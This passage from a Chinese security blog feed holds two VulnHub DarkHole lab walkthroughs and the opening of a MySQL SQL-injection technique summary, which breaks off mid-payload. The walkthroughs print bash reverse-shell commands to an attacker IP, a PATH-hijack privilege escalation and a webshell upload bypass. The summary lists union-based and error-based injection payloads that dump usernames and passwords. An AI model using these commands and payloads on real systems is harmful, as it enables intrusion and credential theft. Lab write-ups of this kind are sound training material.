src="https://raw.githubusercontent.com/chencicici/images/main/202206252142189.png"></p><p>审计几个php文件,没有收获</p><h2 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h2><p>递归下载目录<br>脚本地址 <a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python git_dumper.py http://172.16.17.154/.git website</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252152596.png"></p><p>审计日志<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252154557.png"></p><p>第一次为初始化,第二次added login.php,第三次changed login.php</p><p>第二次添加了默认凭据</p><pre><code> I added login.php file with default credentials</code></pre><p>继续跟进,查看两次的差异</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff a4d900a8d85e8938d3601f3cef113ee293028e10</span><br></pre></td></tr></table></figure><p>拿到账号密码,同时看到sql语句<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252207747.png"></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>登录成功,看到id字眼,结合上面看到的sql语句,此处存在sql注入<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252209727.png"></p><p>修改id为0时,内容消失<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252213507.png"></p><p>1&#x3D;1回显正常<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252217059.png"></p><p>1&#x3D;2无回显<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252217080.png"></p><p>丢sqlmap跑,需要带上cookie<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252223888.png"></p><p>在数据库中跑出ssh密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252229820.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252231283.png"></p><p>拿到第一个flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252232348.png"></p><p>提权信息收集<br>sudo -l没有<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252234087.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252234966.png"></p><p>在历史命令翻到可疑记录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252236595.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252236339.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://localhost:999/?cmd=id&quot;</span> </span><br><span class="line">curl <span class="string">&quot;http://localhost:9999/?cmd=id&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=ls -la&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=ls%20-la&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=cd%20~&amp;ls&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=cd%20~&amp;&amp;ls&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=cd%20~||ls&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看来存在命令执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252238693.png"></p><p>发现,是losy用户,反弹一个shell,需要注意的是,因为是url执行,所以需要url编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=bash%20-c%20&#x27;exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F172.16.17.140%2F4444%20%3C%261&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252251755.png"></p><p>历史命令看到密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252250920.png"></p><p>ssh上losy用户查看sudo权限的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252252937.png"></p><p>根据历史命令的提示,用python拿到一个shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252255400.png"></p><p>拿到最后的flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252256615.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/darkhole-2,740/&quot;&gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.154&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap 扫描靶机&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206252101537.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;访问一下首页,看看web指纹&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206252102462.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="信息泄露" scheme="https://syst1m.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-darkhole:1打靶</title>
    <link href="https://syst1m.top/2022/06/24/vulnhub-darkhole:1%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/24/vulnhub-darkhole:1%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-24T09:18:07.000Z</published>
    <updated>2022-06-24T14:55:30.432Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a><br>靶机:172.16.17.153<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫一下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241816412.png"></p><p>插件看到web指纹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242200037.png"></p><p>扫一下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241829627.png"></p><p>config目录存在目录遍历,下载不下来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241830409.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>注册一个账号看看,在注册的时候,用户名使用admin,报用户或者邮箱存在,应该存在一个admin账号,继续往下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241827069.png"></p><p>登录进去,发现可以修改密码,同时url处看到id&#x3D;2<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242147073.png"></p><p>修改id为1,提示没有权限,那么此处应该存在越权<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242148896.png"></p><p>抓包修改密码的数据包<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242151674.png"></p><p>修改id参数<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242153137.png"></p><p>退出test账号,使用admin登录,登录成功,出现一个上传点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242155345.png"></p><h2 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h2><p>上传一句话发现有限制<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242158827.png"></p><p>传一个.php3后缀的试试,发现可以上传,虽然不被解析,但起码说明并不是白名单<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242156017.png"></p><p>前面得到服务器为apache,尝试apache解析漏洞,抓包慢慢fuzz<br>最后使用.phtml成功绕过,<a href="https://syst1m.top/2022/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">中间件解析漏洞</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242215173.png"></p><p>看一下最开始信息收集的那个database.php,得到数据库账号密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242227736.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>蚁剑反弹一个交互式shell到kali</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/172.16.17.140/4444 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242219996.png"></p><p>在家目录下翻到一个john用户,存在root权限的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242229612.png"></p><p>运行发现是以john用户执行了id命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242230601.png"></p><p>思路:我们可以自己构造一个id命令写入shell,替换掉原来的环境变量到这我们构造的id命令下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt; /tmp/id; <span class="built_in">chmod</span> +x /tmp/id; <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242235087.png"></p><p>在john家目录下得到flag和john的密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242243076.png"></p><p>ssh得到一个完全交互式shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242244133.png"></p><p>看一下sudo执行的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242252290.png"></p><p>写入反弹shell的python语句<br>这里要注意,要使用绝对路径去执行file.py,否则会报权限不够<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242253772.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/darkhole-1,724/&quot;&gt;https://www.vulnhub.com/entry/darkhole-1,724/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.153&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap扫一下&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206241816412.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;插件看到web指纹&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206242200037.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="越权" scheme="https://syst1m.top/tags/%E8%B6%8A%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>sql注入之mysql注入姿势及绕过总结</title>
    <link href="https://syst1m.top/2022/06/24/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>https://syst1m.top/2022/06/24/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
    <published>2022-06-24T05:37:14.000Z</published>
    <updated>2022-06-30T05:26:45.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>随着互联网web和信息技术的发展，在web后端作为存储和管理的的数据库也得到了广泛的应用，与web结合较为紧密的数据库包括Mysql，Sqlserver，Oracle，Sqllite，Db2，Access等等。 数据存储和管理作为应用的一个基本需求，在绝大多数的应用里都得到了使用，这种大面积的使用也意味着在数据库操作方面如果处理不当出现问题的可能性会很大，另外一方面由于数据库承载了应用的数据信息，如果数据库出现问题一方面可能导致敏感数据的泄露和篡改（如信用卡账户，用户密码，管理账户和密码，销售记录等等），直接导致损失和应用被攻陷，另外一方面，即使数据库中不承载较为敏感的信息，由于数据库的特殊性，数据库被攻击的话也可以直接导致应用程序崩溃及其他严重的后果。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>应用为了和数据库进行沟通完成必要的管理和存储工作，必须和数据库保留一种接口。目前的数据库一般都是提供api以支持管理，应用使用底层开发语言如Php，Java，asp，Python与这些api进行通讯。对于数据库的操作，目前普遍使用一种SQL语言（Structured Query Language语言，SQL语言的功能包括增删查改等，是一个综合的、通用的关系数据库语言，同时又是一种高度非过程化的语言，只要求用户指出做什么而不需要指出怎么做），SQL作为字符串通过API传入给数据库，数据库将查询的结果返回，数据库自身是无法分辨传入的SQL是合法的还是不合法的，它完全信任传入的数据，如果传入的SQL语句被恶意用户控制或者篡改，将导致数据库以当前调用者的身份执行预期之外的命令并且返回结果，导致安全问题。 那么恶意用户如何才能控制传入的SQL语句呢？我们知道，既然传入的SQL是以字符串的方式传入的，这个字符串由应用生成，那么如果应用生成这个字符串的方式不对就可能导致问题，譬如考虑如下的功能：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from members where userid=&quot;</span>.<span class="variable">$_GET</span>[userid];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>这段代码的逻辑是根据用户请求的Userid进入数据库查询出不同的用户并且返回给用户，可以看到最终传入的字符串有一部分是根据用户的输入来控制的，一旦用户提交<code>poc.php?userid=1 or 1=1</code>最终进入程序之后传入数据库的逻辑将是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from members where userid=1 or 1=1&quot;</span>);</span><br></pre></td></tr></table></figure><p>用户完全可以根据传入的内容来控制整个SQL的逻辑，实现间接控制和管理数据库的目的，<code>这种命令（SQL语句）和数据（用户提交的查询）不分开的实现方式导致了安全漏洞的产生。</code> 由于不同的开发语言可能对api进行了不同的封装，并且各种语言内部对数据的校验会有不同的要求，譬如java和python属于变量强类型并且各种开发框架的流行导致出现SQL注射的几率较小，php属于弱类型不会对数据进行强制的验证加上过程化的程序编写思路导致出现注射的几率会较大。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>通过典型的SQL注射漏洞，黑客是可以根据所能控制的内容在SQL语句的上下文导致不同的结果的，这种不同主要体现在不同的<code>数据库特性上和细节上</code>。同时，后端的数据库的不同导致黑客能利用SQL语句进行的操作也并不相同，因为很多的数据库在标准的SQL之外也会实现一些自身比较特别的功能和扩展，<code>常见的有Sqlserver的多语句查询，Mysql的高权限可以读写系统文件，Oracle经常出现的一些系统包提权漏洞。</code> 即使一些SQL注射本身无法对数据本身进行一些高级别的危害，譬如一些数据库里可能没有存储私密信息，利用SQL查询的结果一样可能对应用造成巨大的灾难，因为应用可能将从数据库里提取的信息做一些其他的比较高危险的动作，譬如进行文件读写，这种本身无价值的数据和查询一旦被应用本身赋予较高的意义的话，可能一样导致很高的危害。 评估一个SQL注射的危害需要取决于注射点发生的SQL语句的上下文，SQL语句在应用的上下文，应用在数据库的上下文，综合考虑这些因素来评估一个SQL注射的影响，在无上述利用结果的情况下，通过web应用向数据库传递一些资源要求极高的查询将导致数据库的拒绝服务，这将是黑客可能能进行的最后的利用。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>比较传统的修复方式一般认为是对输入的数据进行有效的过滤，但是由于输入的来源太过广泛，可能来自于数据库，HTTP请求，文件或者其他的数据来源，较难对所有进入的数据在各种场景下进行有效的过滤。 事实上最罪恶的不是数据，而是我们使用数据的方式，最为彻底的修复一定要查找最为彻底的根源，我们可以看到最后的根源在于对数据和指令的不分离，所以在修复的时候应该极力将数据和指令分离。目前较为提倡的，同时在各种数据库操作框架里体现的方式就是以填充模板的方式来代替传统的拼接的方式进行数据库查询，譬如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SqlTemplate</span>=<span class="string">&quot;select * from members where userid=&#123;userid|int&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">PreSql</span>(<span class="variable">$SqlTemplate</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>模板里有关数据及数据自身意义的描述，PreSql方法将实现将模板和数据安全的转换为SQL语句的功能，以保障最终的安全的实现</p><h1 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>我们篡改SQL语句很多时候都会使用到注释，SQL语法中的注释符有以下几种：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">--+(这里的+其实是空格的意思，因为我们的注入时+通常会被识别为空格，这是早期养成的习惯，但是后来在看一些大牛的文章的时候会发现他们更爱用-- -这种形式，很多工具等等也是)</span><br><span class="line"><span class="regexp">/**/</span>(这个也不太常用)</span><br></pre></td></tr></table></figure><h2 id="包含信息的内置表"><a href="#包含信息的内置表" class="headerlink" title="包含信息的内置表"></a>包含信息的内置表</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">information_schema.<span class="keyword">tables</span></span><br><span class="line">information_schema.<span class="keyword">columns</span></span><br></pre></td></tr></table></figure><h1 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h1><h2 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h2><p>MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种 <code>关联数据库管理系统</code> ，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p><ul><li>MySQL是开源的，所以你不需要支付额外的费用。</li><li>MySQL使用标准的 SQL 数据语言形式。</li><li>MySQL可以运行于多个系统上，并且 支持多种语言 。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。</li><li>MySQL 对PHP有很好的支持 ，PHP 是目前最流行的 Web 开发语言。</li><li>MySQL 支持大型数据库 ，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。</li><li>MySQL是 可以定制的 ，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。</li></ul><p>一个完整的mysql管理系统结构通常如下图：<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241358298.png"></p><p>可以看到，mysql可以管理 <code>多个数据库</code> ，一个数据库可以包含 <code>多个数据表</code>，而一个数据表有含有 <code>多条字段</code> ，一行数据正是多个字段同一行的一串数据。</p><p>Mysql具有很独特的特点而且使用最为广泛，Mysql数据库本身的权限极高，作为应用可以对本机进行文件读写，可以进行提权等。</p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>很多时候联合查询也会和其他的几种查询方式一起使用。<br>联合查询用到的SQL语法知识</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UNION</span>可以将前后两个查询语句的结果拼接到一起，但是会自动去重。</span><br><span class="line"><span class="built_in">UNION</span> <span class="built_in">ALL</span>功能相同，但是会显示所有数据，不会去重。</span><br></pre></td></tr></table></figure><p>具有类似功能的还有JOIN <a href="https://blog.csdn.net/julielele/article/details/82023577">https://blog.csdn.net/julielele/article/details/82023577</a> 但是是一个对库表等进行连接的语句，我们在后续的绕过中会提到利用它来进行无列名注入。</p><ol><li><p>判断是否存在注入，注入是字符型还是数字型，闭合情况，绕过方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; </span></span><br><span class="line"><span class="string">?id=1&quot; </span></span><br><span class="line"><span class="string">?id=1&#x27;</span>) </span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot;) </span></span><br><span class="line"><span class="string">?id=1&#x27; or 1#</span></span><br><span class="line"><span class="string">?id=1&#x27; or 0#</span></span><br><span class="line"><span class="string">?id=1&#x27; or 1=1#</span></span><br><span class="line"><span class="string">?id=1&#x27; and 1=2#</span></span><br><span class="line"><span class="string">?id=1&#x27; and sleep(5)#</span></span><br><span class="line"><span class="string">?id=1&#x27; and 1=2 or &#x27; </span></span><br><span class="line"><span class="string">?id=1\</span></span><br></pre></td></tr></table></figure></li><li><p>猜测SQL查询语句中的字段数</p></li></ol><ul><li>使用 order&#x2F;group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 1#</span></span><br><span class="line"><span class="string">1&#x27;</span> order by 2<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27; order by 3#</span></span><br><span class="line"><span class="string">1 order by 1</span></span><br><span class="line"><span class="string">1 order by 2</span></span><br><span class="line"><span class="string">1 order by 3</span></span><br><span class="line"><span class="string">```   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。</span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27; union select 1,2#</span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1,2,3<span class="comment">#</span></span><br><span class="line">1 union select 1<span class="comment">#</span></span><br><span class="line">1 union select 1,2<span class="comment">#</span></span><br><span class="line">1 union select 1,2,3<span class="comment">#</span></span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li>确定显示数据的字段位置<br>使用 union select 1,2,3,4,… 根据回显的字段数，判断回显数据的字段位置。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1#</span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,2<span class="comment">#</span></span><br><span class="line">-1<span class="string">&#x27; union select 1,2,3#</span></span><br><span class="line"><span class="string">-1 union select 1#</span></span><br><span class="line"><span class="string">-1 union select 1,2#</span></span><br><span class="line"><span class="string">-1 union select 1,2,3#</span></span><br></pre></td></tr></table></figure></li></ol><p>注意：</p><ul><li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。</li><li>⼀定要拼接够足够的字段数，否则SQL语句报错。</li></ul><ol start="4"><li>在回显数据的字段位置使用 union select 将我们所需要的数据查询出来即可。包括但不限于：</li></ol><ul><li><p>获取当前数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库的表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取表中的字段名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&#x27;users&#x27;</span>),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,(select group_concat(<span class="built_in">id</span>,0x7c,username,0x7c,password) from <span class="built_in">users</span>),3--+</span><br></pre></td></tr></table></figure><p>一般情况下就是这样的一个顺序，<code>确定联合查询的字段数-&gt;确定联合查询回显位置-&gt;爆库-&gt;爆表-&gt;爆字段-&gt;爆数据。</code></p></li></ul><p>我们可以看到这里使用了group_concat来拼接查询多个数据，在很多种查询中都有使用这个函数来提高效率，同时还可以拼接十六进制特殊字符来分隔，同时还使用了information_shcema表获取表信息、字段信息，这个表在低版本mysql中不存在，同时有时还会被过滤，这也会是我们绕过的一个方向。</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>大体的思路就是利用报错回显，同时我们的查询指令或者SQL函数会被执行，<code>报错的过程可能会出现在查询或者插入甚至删除的过程中。</code></p><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>floor()（8.x&gt;mysql&gt;5.0）<code>双查询报错注入</code><br>函数返回小于或等于指定值（value）的最小整数,取整</p><p>通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1<br>group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<br>group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=0’ union select 1,2,3 from(select count(*),concat((select concat(version(),’-’,database(),’-’,user()) <span class="built_in">limit</span> 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">/*拆解出来就是下面的语句*/</span><br><span class="line">concat((select concat(version(),’-’,database(),’-’,user()) <span class="built_in">limit</span> 